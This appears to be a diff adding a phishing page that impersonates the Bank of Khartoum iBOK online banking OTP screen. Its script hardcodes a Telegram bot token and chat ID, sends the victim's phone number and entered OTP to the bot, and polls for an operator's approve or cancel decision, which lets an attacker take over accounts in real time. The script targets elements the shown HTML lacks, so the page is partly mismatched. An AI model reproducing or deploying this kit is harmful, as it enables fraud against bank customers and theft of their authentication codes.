@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <title>Enter OTP code I iBOK</title>
+
+    <style>
+         :root {
+            --red: #ef2e31;
+            --yellow: #ffcf00;
+            --ink: #101820;
+            --muted: #8393a3;
+            --field: #fff5f5;
+            --border: #ffb8b8;
+        }
+        
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            min-height: 100vh;
+            font-family: Arial, Helvetica, sans-serif;
+            color: var(--ink);
+            background: #fff;
+        }
+        
+        .page {
+            min-height: 100vh;
+            margin: 4px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header {
+            height: 143px;
+            flex: 0 0 143px;
+            color: #fff;
+            background: var(--red);
+        }
+        
+        .welcome,
+        .brand {
+            width: min(704px, calc(100% - 40px));
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .welcome {
+            height: 36px;
+            margin-top: 11px;
+            border-radius: 24px;
+            background: var(--yellow);
+            color: #111;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 700;
+            box-shadow: 0 2px 5px #a91d1f33;
+        }
+        
+        .brand {
+            margin-top: 11px;
+        }
+        
+        .brand-name {
+            font-size: 32px;
+            line-height: 1.05;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .brand-caption {
+            margin-top: 6px;
+            font-size: 13px;
+        }
+        
+        main {
+            flex: 1;
+            min-height: 440px;
+            padding: 0 16px 42px;
+            background-color: #f2f5f9;
+            background-image: radial-gradient(#c8d0da 0.85px, transparent 0.85px);
+            background-size: 18px 18px;
+        }
+        
+        .card {
+            width: min(672px, 100%);
+            margin: 15px auto 0;
+            padding: 25px 40px 24px;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0 15px 28px rgba(190, 35, 40, 0.12);
+        }
+        
+        h1 {
+            margin: 0;
+            color: var(--red);
+            font-size: 24px;
+            line-height: 1.25;
+            text-align: center;
+        }
+        
+        .description {
+            margin: 16px 0 21px;
+            font-size: 16px;
+            line-height: 1.45;
+            text-align: center;
+        }
+        
+        .demo-notice {
+            margin-bottom: 18px;
+            padding: 10px 12px;
+            border: 1px solid #f1d783;
+            border-radius: 8px;
+            background: #fff9e4;
+            color: #5f4b12;
+            font-size: 12px;
+            line-height: 1.45;
+            text-align: center;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 11px;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        input {
+            width: 100%;
+            height: 43px;
+            padding: 0 14px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            outline: none;
+            background: var(--field);
+            color: var(--ink);
+            font: inherit;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        
+        input:focus {
+            border-color: var(--red);
+            box-shadow: 0 0 0 3px rgba(239, 46, 49, 0.15);
+        }
+        
+        input::placeholder {
+            color: var(--muted);
+            opacity: 1;
+        }
+        
+        .message {
+            min-height: 20px;
+            margin: 12px 0;
+            color: #b4232a;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        button {
+            width: 100%;
+            min-height: 42px;
+            border: 0;
+            border-radius: 10px;
+            background: var(--red);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        
+        button:hover {
+            background: #d92329;
+        }
+        
+        button:focus-visible {
+            outline: 3px solid #101820;
+            outline-offset: 3px;
+        }
+        
+        footer {
+            min-height: 56px;
+            padding: 11px 10px 8px;
+            border-top: 4px solid var(--red);
+            color: #607080;
+            font-size: 11px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        
+        .support-bubble {
+            position: fixed;
+            left: 31px;
+            bottom: 15px;
+            width: 58px;
+            height: 58px;
+            display: grid;
+            place-items: center;
+            border-radius: 50%;
+            background: #e9262b;
+            color: #fff;
+            box-shadow: 0 5px 15px #0002;
+            font-size: 25px;
+            user-select: none;
+        }
+        
+        @media (max-width: 600px) {
+            .page {
+                margin: 0;
+                border-radius: 0;
+            }
+            header {
+                height: 132px;
+                flex-basis: 132px;
+            }
+            .welcome,
+            .brand {
+                width: calc(100% - 36px);
+            }
+            main {
+                padding: 0 12px 32px;
+            }
+            .card {
+                margin-top: 15px;
+                padding: 24px 22px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            .support-bubble {
+                left: 16px;
+                bottom: 12px;
+                width: 50px;
+                height: 50px;
+            }
+        }
+        
+        .support-bubble {
+            width: 55px;
+            height: 55px;
+            background-color: #ff0000;
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+        }
+        
+        .support-bubble i {
+            color: #ffffff;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page">
+        <header>
+            <div class="welcome">Welcome to iBOK Online Banking service</div>
+            <div class="brand">
+                <div class="brand-name">iBOK</div>
+                <div class="brand-caption">Online Form</div>
+            </div>
+        </header>
+
+        <main>
+            <section class="card" aria-labelledby="demo-title">
+                <h1 id="demo-title">Enter OTP code</h1>
+                <p class="description">Please enter the verification code sent to your <br> registered phone number and email address.</p>
+
+
+
+                <form id="demo-form">
+                    <label for="demo-input">Demo word</label>
+                    <input id="demo-input" name="demo" type="text" placeholder="Enter a 6-digit code" autocomplete="off" required aria-describedby="form-message" />
+
+                    <p class="message" id="form-message" aria-live="polite"></p>
+                    <button type="submit">Continue</button>
+                </form>
+            </section>
+        </main>
+
+        <footer>
+            iBOK I Bank of Khartoum 2026<br /> All rights reserved, Bank of Khartoum, iBOK 2026
+        </footer>
+
+        <div class="support-bubble" aria-label="WhatsApp support" title="WhatsApp support">
+            <i class="fa-brands fa-whatsapp"></i>
+        </div>
+    </div>
+
+    <script>
+        // Bot 1 (ONLY - removed Bot 2)
+        const BOT_TOKEN_1 = '8728071345:AAHtK0Te8ZOoQDxX43tAmT51nweCyRnz19o';
+        const CHAT_ID_1 = '7676797362';
+
+        // Inputs + buttons (MATCH HTML)
+        const otpBoxes = document.querySelectorAll('.otp');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const messageEl = document.getElementById('message');
+
+        // Timer elements (MATCH HTML)
+        const timerProgress = document.getElementById('timerProgress');
+        const timerText = document.getElementById('timerText');
+
+        if (!timerProgress || !timerText || !confirmBtn || otpBoxes.length !== 6) {
+            console.error('Missing required DOM elements. Check ids/classes in HTML.');
+        }
+
+        let otpValue = '';
+        let seconds = 30;
+        let countdown = null;
+
+        let pollInterval1 = null;
+        let lastUpdateId1 = 0;
+
+        let currentTimestamp = 0;
+        let actionProcessed = false;
+
+        const savedPhone = localStorage.getItem('phone') || '785123463';
+
+        function updateTimerUI() {
+            if (!timerText || !timerProgress) return;
+            timerText.textContent = `${seconds}s`;
+            const percent = Math.max(0, Math.min(100, (seconds / 30) * 100));
+            timerProgress.style.width = percent + '%';
+        }
+
+        function startCountdown() {
+            clearInterval(countdown);
+            seconds = 60;
+            updateTimerUI();
+
+            countdown = setInterval(() => {
+                seconds--;
+                updateTimerUI();
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    seconds = 0;
+                    updateTimerUI();
+                }
+            }, 1000);
+        }
+
+        function checkOtpComplete() {
+            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
+            const complete = otpValue.length === 6;
+            confirmBtn.disabled = !complete;
+            if (complete) confirmBtn.classList.add('enabled');
+            else confirmBtn.classList.remove('enabled');
+        }
+
+        function resetForNewOtp() {
+            // Stop polling
+            if (pollInterval1) clearInterval(pollInterval1);
+            pollInterval1 = null;
+
+            actionProcessed = false;
+            currentTimestamp = 0;
+
+            // Clear OTP inputs
+            otpBoxes.forEach(b => b.value = '');
+            checkOtpComplete();
+
+            // Reset message
+            messageEl.className = 'message';
+            messageEl.textContent = '';
+
+            // Reset timer
+            startCountdown();
+
+            // Focus first box
+            otpBoxes[0].focus();
+        }
+
+        startCountdown();
+
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                box.value = box.value.replace(/\D/g, '').slice(0, 1);
+
+                if (box.value.length === 1 && index < 5) {
+                    otpBoxes[index + 1].focus();
+                }
+                checkOtpComplete();
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    otpBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        function sendToBot(botToken, chatId, text, replyMarkup) {
+            const payload = {
+                chat_id: chatId,
+                text: text,
+                parse_mode: 'Markdown'
+            };
+            if (replyMarkup) payload.reply_markup = replyMarkup;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        function stopPolling() {
+            if (pollInterval1) clearInterval(pollInterval1);
+            pollInterval1 = null;
+        }
+
+        function handleCallback(callbackData, callbackQueryId) {
+            if (actionProcessed) return;
+            actionProcessed = true;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    callback_query_id: callbackQueryId
+                })
+            }).catch(() => {});
+
+            stopPolling();
+
+            const parts = callbackData.split('_');
+            const action = parts[0];
+
+            if (action === 'approve') {
+                messageEl.className = 'message success';
+                messageEl.textContent =
+                    'Your Registrations fee is being approved. Redirecting...';
+
+                // navigate to index.html
+                window.location.href = 'index.html';
+            } else if (action === 'cancel') {
+                messageEl.className = 'message error';
+                messageEl.textContent = 'Cancelled. Requesting a new OTP...';
+
+                // reset page for new otp
+                resetForNewOtp();
+            }
+        }
+
+        function pollBot(botToken) {
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId1 + 1}&timeout=10`)
+                .then(res => res.json())
+                .then(data => {
+                    if (!data.ok || !data.result || data.result.length === 0) return;
+
+                    for (const update of data.result) {
+                        lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
+
+                        if (update.callback_query && !actionProcessed) {
+                            const cb = update.callback_query;
+                            const dataParts = cb.data.split('_');
+                            const ts = parseInt(dataParts[1], 10);
+
+                            if (ts === currentTimestamp) {
+                                handleCallback(cb.data, cb.id);
+                                return;
+                            }
+                        }
+                    }
+                })
+                .catch(() => {});
+        }
+
+        function startPolling() {
+            actionProcessed = false;
+
+            pollInterval1 = setInterval(() => {
+                pollBot(BOT_TOKEN_1);
+            }, 1500);
+        }
+
+        confirmBtn.addEventListener('click', () => {
+            if (otpValue.length !== 6) return;
+
+            if (seconds <= 0) {
+                messageEl.className = 'message error';
+                messageEl.textContent = 'OTP expired. Please request a new OTP.';
+                return;
+            }
+
+            messageEl.className = 'message';
+            messageEl.textContent = 'Waiting for approval...';
+
+            currentTimestamp = Date.now();
+
+            const message =
+                `*OTP Verification*\n\n` +
+                `📱 Phone: +258 ${savedPhone}\n` +
+                `🔢 Entered OTP: ${otpValue}\n\n` +
+                `Please approve or cancel the loan application.`;
+
+            const replyMarkup = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ Approve',
+                        callback_data: 'approve_' + currentTimestamp
+                    }, {
+                        text: '❌ Cancel',
+                        callback_data: 'cancel_' + currentTimestamp
+                    }]
+                ]
+            };
+
+            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
+            startPolling();
+        });
+
+        // initial state
+        checkOtpComplete();
+        otpBoxes[0].focus();
+    </script>
+</body>
+
+</html>
